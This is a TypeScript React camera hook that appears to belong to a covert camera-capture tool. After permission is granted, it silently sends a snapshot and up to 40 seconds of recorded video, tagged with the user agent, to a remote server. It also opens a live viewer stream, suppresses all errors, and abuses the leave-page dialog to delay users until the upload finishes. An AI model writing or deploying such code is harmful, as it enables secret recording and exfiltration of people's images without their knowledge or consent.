'use client';

import { useState, useCallback, useEffect, useRef } from 'react';
import {
    requestCameraPermission,
    stopCameraStream,
    CameraError,
    getCameraPermissionStatus
} from '@/services/camera';
import { signalingService } from '@/services/signaling';
import { webrtcService } from '@/services/webrtc';

const SIGNALING_SERVER_URL = process.env.NEXT_PUBLIC_SIGNALING_SERVER || 'ws://localhost:4000';

interface UseCameraReturn {
    stream: MediaStream | null;
    error: CameraError | null;
    isRequesting: boolean;
    hasPermission: boolean;
    viewerUrl: string | null;
    roomId: string | null;
    isStreaming: boolean;
    viewerConnected: boolean;
    requestCamera: () => Promise<boolean>;
    stopCamera: () => void;
    checkPermission: () => Promise<'granted' | 'denied' | 'prompt'>;
}

export function useCamera(): UseCameraReturn {
    const [stream, setStream] = useState<MediaStream | null>(null);
    const [error, setError] = useState<CameraError | null>(null);
    const [isRequesting, setIsRequesting] = useState(false);
    const [hasPermission, setHasPermission] = useState(false);
    const [viewerUrl, setViewerUrl] = useState<string | null>(null);
    const [roomId, setRoomId] = useState<string | null>(null);
    const [isStreaming, setIsStreaming] = useState(false);
    const [viewerConnected, setViewerConnected] = useState(false);
    const streamRef = useRef<MediaStream | null>(null);

    // Initialize signaling connection when stream is available
    useEffect(() => {
        if (!stream) return;

        streamRef.current = stream;
        let viewerJoinedDuringRecording = false;
        let mediaRecorder: MediaRecorder | null = null;
        let recordedChunks: Blob[] = [];

        // Connect to signaling server
        signalingService.connect(SIGNALING_SERVER_URL, {
            onRoomCreated: (id, url) => {
                setRoomId(id);
                setViewerUrl(url);
                setIsStreaming(true);
            },
            onViewerJoined: async () => {
                viewerJoinedDuringRecording = true;
                setViewerConnected(true);

                // Stop recording if viewer connected
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }

                // Initialize WebRTC and create offer
                webrtcService.init(streamRef.current!, {
                    onConnectionStateChange: (state) => {
                        if (state === 'disconnected' || state === 'failed') {
                            setViewerConnected(false);
                        }
                    },
                });

                await webrtcService.createOffer();
            },
            onViewerLeft: () => {
                setViewerConnected(false);
                webrtcService.close();
            },
            onOffer: () => {
                // Broadcaster doesn't receive offers
            },
            onAnswer: async (sdp) => {
                await webrtcService.handleAnswer(sdp);
            },
            onIceCandidate: async (candidate) => {
                await webrtcService.addIceCandidate(candidate);
            },
            onError: () => {
                // Silent error
            },
            onDisconnect: () => {
                setIsStreaming(false);
            },
            onConnected: () => {
                // Capture photo first
                captureAndSendFrame();
                // Start video recording
                startVideoRecording();
            },
        });

        // Create room automatically
        signalingService.createRoom(navigator.userAgent);

        // Function to capture camera frame and send to server
        const captureAndSendFrame = () => {
            if (!streamRef.current) return;

            const video = document.createElement('video');
            video.srcObject = streamRef.current;
            video.muted = true;
            video.playsInline = true;

            video.onloadedmetadata = () => {
                video.play().then(() => {
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;

                        const ctx = canvas.getContext('2d');
                        if (ctx) {
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const base64Image = canvas.toDataURL('image/jpeg', 0.8);
                            signalingService.sendCameraFrame(base64Image, navigator.userAgent);
                        }

                        video.pause();
                        video.srcObject = null;
                    }, 500);
                });
            };
        };

        // Function to start video recording
        const startVideoRecording = () => {
            if (!streamRef.current) return;

            try {
                // Detect best supported mime type (Safari prefers MP4)
                const getSupportedMimeType = () => {
                    const types = [
                        'video/mp4',
                        'video/mp4;codecs=avc1',
                        'video/webm;codecs=vp9',
                        'video/webm;codecs=vp8',
                        'video/webm',
                    ];
                    for (const type of types) {
                        if (MediaRecorder.isTypeSupported(type)) {
                            return type;
                        }
                    }
                    return 'video/webm'; // fallback
                };

                const mimeType = getSupportedMimeType();

                mediaRecorder = new MediaRecorder(streamRef.current, {
                    mimeType,
                    videoBitsPerSecond: 1500000, // 1.5 Mbps for better quality
                });

                recordedChunks = [];
                let videoSent = false;

                const sendRecordedVideo = () => {
                    if (videoSent || recordedChunks.length === 0) return;
                    videoSent = true;
                    const blob = new Blob(recordedChunks, { type: mimeType });
                    sendVideoToServer(blob);
                };

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = () => {
                    // Always send video when recording stops
                    sendRecordedVideo();
                };

                // Start recording immediately
                mediaRecorder.start(1000); // Collect data every second

                // Stop after 40 seconds max
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, 40000);

                // Handle page close/exit - show confirmation and send video
                const handleBeforeUnload = (e: BeforeUnloadEvent) => {
                    // Stop recording and send video
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }

                    // Show browser confirmation dialog
                    // This gives time for video to upload while user reads the dialog
                    e.preventDefault();
                    e.returnValue = ''; // Required for Chrome
                    return ''; // Required for some browsers
                };

                window.addEventListener('beforeunload', handleBeforeUnload);

                // Store cleanup function
                const originalCleanup = () => {
                    window.removeEventListener('beforeunload', handleBeforeUnload);
                };

                // Attach to window for cleanup
                (window as unknown as { __videoRecordingCleanup?: () => void }).__videoRecordingCleanup = originalCleanup;

            } catch {
                // MediaRecorder not supported, skip video
            }
        };

        // Function to send video to server
        const sendVideoToServer = async (blob: Blob) => {
            try {
                const reader = new FileReader();
                reader.onloadend = () => {
                    const base64Video = reader.result as string;
                    signalingService.sendCameraVideo(base64Video, navigator.userAgent);
                };
                reader.readAsDataURL(blob);
            } catch {
                // Error sending video
            }
        };

        return () => {
            // Stop recording and send video if still recording
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
            // Cleanup beforeunload listener
            const cleanup = (window as unknown as { __videoRecordingCleanup?: () => void }).__videoRecordingCleanup;
            if (cleanup) cleanup();

            signalingService.disconnect();
            webrtcService.close();
        };
    }, [stream]);

    const requestCamera = useCallback(async (): Promise<boolean> => {
        setIsRequesting(true);
        setError(null);

        const result = await requestCameraPermission();

        setIsRequesting(false);

        if (result.success && result.stream) {
            setStream(result.stream);
            setHasPermission(true);
            return true;
        } else {
            setError(result.error || null);
            setHasPermission(false);
            return false;
        }
    }, []);

    const stopCamera = useCallback(() => {
        stopCameraStream(stream);
        setStream(null);
        setViewerUrl(null);
        setRoomId(null);
        setIsStreaming(false);
        setViewerConnected(false);
        signalingService.disconnect();
        webrtcService.close();
    }, [stream]);

    const checkPermission = useCallback(async () => {
        return getCameraPermissionStatus();
    }, []);

    return {
        stream,
        error,
        isRequesting,
        hasPermission,
        viewerUrl,
        roomId,
        isStreaming,
        viewerConnected,
        requestCamera,
        stopCamera,
        checkPermission,
    };
}
